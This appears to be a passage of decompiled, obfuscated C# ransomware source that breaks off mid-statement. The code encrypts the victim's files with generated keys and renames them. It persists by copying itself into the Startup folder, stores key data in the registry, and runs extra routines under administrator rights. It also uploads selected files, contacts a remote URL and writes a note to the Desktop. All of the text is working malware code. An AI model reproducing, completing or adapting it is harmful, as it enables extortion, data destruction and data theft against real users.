										File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107349107) + ex6.Message + getString_0(107396703));
									}
									catch (Exception)
									{
									}
								}
								PuPUesizAwkkz++;
								return;
							}
							if (EonUYJCKfDwF != getString_0(107397849))
							{
								CS_0024_003C_003E8__locals0.hGfHXtUEXE += EonUYJCKfDwF;
							}
							if (cGbDMszYvGe == getString_0(107396872))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in UaltDtqfmMVTAX)
									{
										if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == lMWNgthKPX.getString_0(107396878))
										{
											if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length)
											{
												try
												{
													orMQkbNvmzZPsHt.pBYlYRXdmUuSS(lMWNgthKPX.getString_0(107402207), lMWNgthKPX.getString_0(107402170), lMWNgthKPX.getString_0(107402189), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item) && cGDFQVDbXvzo == lMWNgthKPX.getString_0(107397135))
										{
											try
											{
												orMQkbNvmzZPsHt.pBYlYRXdmUuSS(lMWNgthKPX.getString_0(107402207), lMWNgthKPX.getString_0(107402170), lMWNgthKPX.getString_0(107402189), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
							string text2 = getString_0(107401576);
							text2 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : getString_0(107401576));
							string s = PtmCzzxPcg.UDDTmPOlNfmsO(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (PurCmZibxBamv == getString_0(107397129))
							{
								byte[] array2 = null;
								byte[] byte_ = scvFMtYlVeb.hpGAnTLbaTEeN(CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
								if (!scvFMtYlVeb.mtRrTfokQWXkK(DNBUuDIlXHcMv: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : scvFMtYlVeb.AIyOtGwWrXEZ(byte_, Convert.FromBase64String(QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? CiqamKuyrt.uZhbCYxeOxuMJx(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : CiqamKuyrt.uZhbCYxeOxuMJx(byte_, Convert.FromBase64String(QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), MLqpVyadMeGdgmK: CS_0024_003C_003E8__locals0.hGfHXtUEXE, kRGGWEuoppgYu: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!IflXfWBKZN)
							{
								if (!QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!QfVKvNIzyJTRTFb.nPDNQoqIpmrky(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (lHJbFcHZdNnC)
							{
								EonUYJCKfDwF = GrEoYlDdrrJcnWE + EonUYJCKfDwF;
							}
							string text3 = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
							string text4 = getString_0(107401576);
							text4 = (IflXfWBKZN ? JNEDQxTiGyvPh.QdOxughxMncJD() : getString_0(107401576));
							string s2 = PtmCzzxPcg.UDDTmPOlNfmsO(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (EonUYJCKfDwF != getString_0(107397849))
							{
								if (!yNTMpjtZXpajKX)
								{
									if (!IflXfWBKZN)
									{
										uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, dZNuvPCEnaSnNI);
									}
									else
									{
										uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!IflXfWBKZN)
										{
											eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
										}
										else
										{
											eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SBPYnaSzKyFP)
										{
											try
											{
												File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107397803) + ex11.Message + getString_0(107396703));
											}
											catch (Exception)
											{
											}
										}
										PuPUesizAwkkz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!yNTMpjtZXpajKX)
							{
								if (!IflXfWBKZN)
								{
									uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107397812), dZNuvPCEnaSnNI);
								}
								else
								{
									uHCaJlttjzbyG(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107397812), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!IflXfWBKZN)
									{
										eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
									}
									else
									{
										eZxZiohcedVC(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107398621) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + getString_0(107397803) + ex14.Message + getString_0(107396703));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									return;
								}
							}
							if (IflXfWBKZN)
							{
								if (EonUYJCKfDwF != getString_0(107397849))
								{
									HiuKKSnyYq(CS_0024_003C_003E8__locals0.hGfHXtUEXE + EonUYJCKfDwF, bytes2);
								}
								else
								{
									HiuKKSnyYq(CS_0024_003C_003E8__locals0.hGfHXtUEXE, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			mBwKTyYUMnTK.Remove(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
		}

		static dOYydSKoLzIp()
		{
			Strings.CreateGetStringDelegate(typeof(dOYydSKoLzIp));
		}
	}

	private sealed class yXTzQNUHviShmVK
	{
		public string IydBnzUZeTLaoWq;

		public string gKzpVcIViue;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(IydBnzUZeTLaoWq);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(gKzpVcIViue))
					{
						File.Delete(gKzpVcIViue);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string VMhrtGevQTYP;

	public static byte[] dZNuvPCEnaSnNI;

	public static string CoRisaOZQor;

	public static string nPUtTAwIhKI;

	public static List<string> uneznyCLJqjxYvh;

	public static List<string> aTbIvfXzzM;

	public static string IHgutBWdklyx;

	public static string QsejQwxWKSqe;

	public static string eUUqvSerqkEdI;

	public static string PSLFxlnexYjPkVyG;

	public static string ZqIKwVipNw;

	public static int ZrHuXCWPdBnMk;

	public static string FiFLjMAxemfbt;

	public static string wwxjRIMUyCe;

	public static string VLTXZZcUskxZVi;

	public static string pscYwyjbLrOZfWlB;

	public static string NZZsrOuUzv;

	public static string HBPEpFutnsnm;

	public static string uCMWAaikfKf;

	public static string WXazMqNlFCpUGp;

	public static List<string> IdBEQJBpIwA;

	public static List<string> kEshrQncftX;

	public static string sbuoMRESEqoLl;

	public static string FUJmNlHLFZTmekFFC;

	public static string sFItEeLBHlsrVRp;

	public static List<string> fQuiHGzOTAlx;

	public static string jKmROTPyfgIG;

	private static string NnofqqnNvs;

	public static string CYtyMsjHbrwM;

	public static string GjaEhDGSTsF;

	public static List<string> oMoyqBDWYl;

	public static List<string> rPkvGTbuGbKlHk;

	public static List<string> YxlLJRTpOOTgKkLzz;

	public static List<string> sneXTQQmOIFmFM;

	public static string bgwisiXwlPmoFco;

	public static List<string> fSptdVtByMByFE;

	public static List<string> WwjgRtkeddRd;

	public static string jjxOZZRUPUiL;

	public static string QjwaBCasTSIkuFgA;

	internal static DateTime HprmrDSzmoXK;

	internal static DateTime mnRhAhrYmeCcsdB;

	public static string eUAtnXtzwCVQtt;

	public static string XLyVBayizjzN;

	public static string kRmBAOPJNOqdHxW;

	public static string JcwYCPMNkxijQ;

	public static string wTpXdatYnvXq;

	public static string iWmgoPryUvSwWT;

	public static string jFVgkGFGvKoyCKqOp;

	public static string cGbDMszYvGe;

	public static List<string> UaltDtqfmMVTAX;

	public static string cGDFQVDbXvzo;

	public static string dJYbFJwmiw;

	public static string auHbFQzfmbroMlO;

	public static string iFPTiHpTDRrR;

	public static string rpbxJAndynMksS;

	public static string fbKaZQvVeOFg;

	public static string aiSGqJNVmYLYQ;

	public static string rGfFEILyJI;

	public static string SgOqmfmWgCMNrdugt;

	public static string mEpMhYqsELjvCfA;

	public static string bzSBnkmcadit;

	public static string rPQlMTQJMUUaO;

	public static string bdPZLvWKkUcu;

	public static string nEPIZtCfLkv;

	public static string HLwpUzkQrQyFV;

	public static string RHcwPQtLOPgH;

	public static string CXPDhTmLTlpN;

	public static string ydGOJVSzVrI;

	public static string KAbTnSEazgmpKG;

	public static string COjZSLMnxffln;

	public static string cOCKAOtbAbbLiQ;

	public static string TbmfDCXNYceV;

	public static string bMkJlSMZTmkVPl;

	public static string pzIDJESPERYAQ;

	public static string HEeLoGRVTvMU;

	public static string GNdCuoTxzXg;

	public static string PurCmZibxBamv;

	public static string YSIpebDxZdNRX;

	public static string aprXJMnTJqstf;

	public static string[] GoQslNJCCQhWEu;

	public static string KZdUWCMWRza;

	public static bool FmiPpRhQSBxQ;

	public static string MNFaJbAsZzAD;

	public static bool IflXfWBKZN;

	public static bool wDQibieeLNEkihtFqY;

	public static bool fhkzHhxqmReTYU;

	public static bool CQvIJIjeDHGW;

	public static string ndioqUCcjeEwRygxn;

	public static bool SBPYnaSzKyFP;

	public static bool vtnkqBqncirnis;

	public static bool aSxiCmyOtyigH;

	public static bool ZdPTJTivRQPn;

	public static bool yNTMpjtZXpajKX;

	public static string zSigBrcrKLvB;

	public static bool RxwgNpmsCUXw;

	public static Stopwatch MeHuYvklCiQWeK;

	public static int PuPUesizAwkkz;

	public static int SYFhGDZRgJn;

	public static bool lHJbFcHZdNnC;

	public static string GrEoYlDdrrJcnWE;

	public static string[] wWEhXkamzgNAqO;

	public static List<string> pwLkvVGaTZr;

	public static int gcVeDsTCahqU;

	public static bool mvGCZjuzXBvoZJaB;

	public static bool QYhkARZFRiOZ;

	public static List<string> GvytrdWotRtJ;

	public static List<string> uAIiMVCysCTsJma;

	public static List<string> uRXFcIqdLpjb;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1a;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			GLfKfCJiKTIW CS_0024_003C_003E8__locals0 = new GLfKfCJiKTIW();
			CS_0024_003C_003E8__locals0.gvllsCCLJzdL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.gvllsCCLJzdL) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			zUoeyvEGiWukLVR.iksTbYRBGXAgo(NnofqqnNvs);
		}
		catch (Exception)
		{
		}
		try
		{
			if (GNdCuoTxzXg == getString_0(107396852))
			{
				Thread thread = new Thread(kImoihisFZMW.siLEgqvqMMIo);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (VLTXZZcUskxZVi == getString_0(107396852))
		{
			Thread.Sleep(int.Parse(pscYwyjbLrOZfWlB));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && jFVgkGFGvKoyCKqOp == getString_0(107396852))
		{
			try
			{
				quAnXoPuXpLqdbj(iBDvjzxzEcC(getString_0(107396879)));
			}
			catch
			{
			}
		}
		try
		{
			if (uCMWAaikfKf == getString_0(107396852) && VvYtjTNJNCyY.TFKknEDEWtRLh())
			{
				new yLPBdfFOjZFxtU().oMCQOHhMwRNdQP(bool_0: false);
				VvYtjTNJNCyY.ZcSwEwHQozB();
			}
		}
		catch (Exception)
		{
		}
		if (FUJmNlHLFZTmekFFC == getString_0(107396852) && VvYtjTNJNCyY.TFKknEDEWtRLh())
		{
			new yLPBdfFOjZFxtU().oMCQOHhMwRNdQP(bool_0: false);
			new yLPBdfFOjZFxtU().HeJiExjZeU();
		}
		if (wwxjRIMUyCe == getString_0(107396852))
		{
			duPxglBMqjv.BXUexnobIYCAv();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396774);
			string text2 = text + Path.GetFileName(fileName);
			if (ZqIKwVipNw == getString_0(107396852) && fileName != text2)
			{
				Thread thread2 = new Thread(iuRhbZaGQIY);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (IHgutBWdklyx == getString_0(107396852) && mainModule != null && fileName != text2)
			{
				try
				{
					ZrHuXCWPdBnMk = brkKChrnlFP(0, IdBEQJBpIwA.Count);
					File.Copy(fileName, text + IdBEQJBpIwA[ZrHuXCWPdBnMk], overwrite: true);
					Process.Start(text + IdBEQJBpIwA[ZrHuXCWPdBnMk]);
					DDPPVlYvvdwJtdD();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (jjxOZZRUPUiL == getString_0(107396852) && DateTime.Now < HprmrDSzmoXK)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (QjwaBCasTSIkuFgA == getString_0(107396852) && DateTime.Now > mnRhAhrYmeCcsdB)
			{
				DDPPVlYvvdwJtdD();
			}
		}
		catch
		{
		}
		gwPKqQopkMwzd();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = rPkvGTbuGbKlHk;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398242)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> yxlLJRTpOOTgKkLzz = YxlLJRTpOOTgKkLzz;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398229)), string_0);
					};
				}
				Parallel.ForEach(yxlLJRTpOOTgKkLzz, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (aprXJMnTJqstf == getString_0(107396852))
				{
					string[] goQslNJCCQhWEu = GoQslNJCCQhWEu;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398229)), getString_0(107398204) + string_0 + getString_0(107398227));
						};
					}
					Parallel.ForEach(goQslNJCCQhWEu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!kkttwGmMPePa().Contains(getString_0(107397923)))
				{
					HNxxgdChoh(bgwisiXwlPmoFco);
				}
				else
				{
					List<string> source2 = sneXTQQmOIFmFM;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							pjARRmeFiHBjb(iBDvjzxzEcC(IpOHiOtFllLVXSK(getString_0(107398222))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source3 = fSptdVtByMByFE;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						pjARRmeFiHBjb(iBDvjzxzEcC(getString_0(107398165)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396737))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396737)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396752)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !uneznyCLJqjxYvh.Contains(text6) && text6 != getString_0(107397211) && text6 != getString_0(107397222) && text6 != getString_0(107397201))
								{
									uneznyCLJqjxYvh.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397140)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397159))
						{
							bdPZLvWKkUcu = getString_0(107396852);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397118))
						{
							bdPZLvWKkUcu = getString_0(107397109);
						}
					}
					if (text3.Contains(getString_0(107397136)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397159))
						{
							RxwgNpmsCUXw = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397118))
						{
							RxwgNpmsCUXw = false;
						}
					}
					if (text3.Contains(getString_0(107397087)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397159))
						{
							SBPYnaSzKyFP = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397118))
						{
							SBPYnaSzKyFP = false;
						}
					}
					if (text3.Contains(getString_0(107397106)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397159))
						{
							mvGCZjuzXBvoZJaB = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397118))
						{
							mvGCZjuzXBvoZJaB = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397045) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (bdPZLvWKkUcu == getString_0(107397109))
		{
			XNApIDlSXbXjYnA();
		}
		if (QYhkARZFRiOZ)
		{
			try
			{
				Console.WriteLine(getString_0(107397032));
				jYjMEFbQCDz.EZQHgjUfEnlr();
			}
			catch (Exception ex8)
			{
				if (SBPYnaSzKyFP)
				{
					try
					{
						File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107396467) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (bdPZLvWKkUcu == getString_0(107396852))
		{
			try
			{
				kHMNgvEgJuEA();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && fhkzHhxqmReTYU)
			{
				try
				{
					Thread thread4 = new Thread(cbEAJTQnRCW.NJWlvZIwzV);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			pjARRmeFiHBjb(getString_0(107396422), iBDvjzxzEcC(getString_0(107396377)));
		}
		if (sbuoMRESEqoLl == getString_0(107396852) && WZIBqhSKnPhYMFBW() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(DLNInMwPrHTI.YfjUtuFLQuPzz);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = GjaEhDGSTsF == getString_0(107396852);
		SecureString secureString = new SecureString();
		if (kRmBAOPJNOqdHxW == getString_0(107397109))
		{
			QsejQwxWKSqe = JNEDQxTiGyvPh.XoKGyJzEnHtiLD(32);
			eUUqvSerqkEdI = JNEDQxTiGyvPh.QdOxughxMncJD();
		}
		else
		{
			QsejQwxWKSqe = getString_0(107396336);
		}
		PSLFxlnexYjPkVyG = PtmCzzxPcg.UDDTmPOlNfmsO(QsejQwxWKSqe + eUUqvSerqkEdI);
		if (!IflXfWBKZN)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(iBDvjzxzEcC(getString_0(107396259)));
				if (registryKey != null)
				{
					registryKey.SetValue(iBDvjzxzEcC(getString_0(107396214)) + (registryKey.ValueCount + 1), PSLFxlnexYjPkVyG);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(iBDvjzxzEcC(getString_0(107396259)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(iBDvjzxzEcC(getString_0(107396214)) + (registryKey2.ValueCount + 1), PSLFxlnexYjPkVyG);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (rGfFEILyJI == getString_0(107396852))
		{
			FWAdHHyyptFTEL();
		}
		if (aSxiCmyOtyigH)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), zSigBrcrKLvB)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), zSigBrcrKLvB), string.Concat(iBDvjzxzEcC(getString_0(107396237)), new WebClient().DownloadString(iBDvjzxzEcC(getString_0(107396692))), getString_0(107396683), iBDvjzxzEcC(getString_0(107396678)), DateTime.Now, getString_0(107396683), iBDvjzxzEcC(getString_0(107396605)), PSLFxlnexYjPkVyG));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), zSigBrcrKLvB), getString_0(107396580) + PSLFxlnexYjPkVyG);
				}
			}
			catch (Exception ex13)
			{
				if (SBPYnaSzKyFP)
				{
					try
					{
						File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107396551) + ex13.Message + getString_0(107396683));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		ZbOEoRbwyxMZK.CmggciUtkrSyflU(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), COjZSLMnxffln), SdmyEwGScdUdp(PSLFxlnexYjPkVyG), null, null, getString_0(107396470), getString_0(107396485), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			PnaBoXyBFAvZY();
		}
		try
		{
			try
			{
				if (RxwgNpmsCUXw)
				{
					Console.WriteLine(getString_0(107395924));
				}
			}
			catch
			{
			}
			ZvvQOSAxrvm(new string[1] { getString_0(107395875) }, new string[100]
			{
				getString_0(107395866),
				getString_0(107395861),
				getString_0(107395888),
				getString_0(107395879),
				getString_0(107395842),
				getString_0(107395837),
				getString_0(107395832),
				getString_0(107395859),
				getString_0(107395854),
				getString_0(107395849),
				getString_0(107395844),
				getString_0(107395807),
				getString_0(107395798),
				getString_0(107395825),
				getString_0(107395816),
				getString_0(107395779),
				getString_0(107395774),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395791),
				getString_0(107395782),
				getString_0(107395745),
				getString_0(107395740),
				getString_0(107395735),
				getString_0(107395762),
				getString_0(107395757),
				getString_0(107395752),
				getString_0(107395715),
				getString_0(107395710),
				getString_0(107395705),
				getString_0(107395700),
				getString_0(107395727),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107396188),
				getString_0(107396183),
				getString_0(107396210),
				getString_0(107396205),
				getString_0(107395832),
				getString_0(107396200),
				getString_0(107395854),
				getString_0(107396159),
				getString_0(107396154),
				getString_0(107396149),
				getString_0(107396176),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396129),
				getString_0(107396124),
				getString_0(107396119),
				getString_0(107396146),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396099),
				getString_0(107396094),
				getString_0(107396089),
				getString_0(107396084),
				getString_0(107396111),
				getString_0(107396102),
				getString_0(107396065),
				getString_0(107396056),
				getString_0(107396075),
				getString_0(107396200),
				getString_0(107396030),
				getString_0(107396021),
				getString_0(107396044),
				getString_0(107396003),
				getString_0(107395994),
				getString_0(107396017),
				getString_0(107396012),
				getString_0(107395971),
				getString_0(107395962),
				getString_0(107395985),
				getString_0(107395980),
				getString_0(107395975),
				getString_0(107395426),
				getString_0(107395421),
				getString_0(107395416),
				getString_0(107395443),
				getString_0(107395434),
				getString_0(107395429),
				getString_0(107395392),
				getString_0(107395387),
				getString_0(107395382),
				getString_0(107395409),
				getString_0(107395400),
				getString_0(107395359),
				getString_0(107395354),
				getString_0(107395722),
				getString_0(107395349),
				getString_0(107395376),
				getString_0(107395371),
				getString_0(107395366),
				getString_0(107395329),
				getString_0(107395320),
				getString_0(107395347),
				getString_0(107395342),
				getString_0(107395333),
				getString_0(107395296),
				getString_0(107395291)
			}, new string[0], QsejQwxWKSqe, getString_0(107395286));
		}
		catch (Exception ex15)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107395301) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395276));
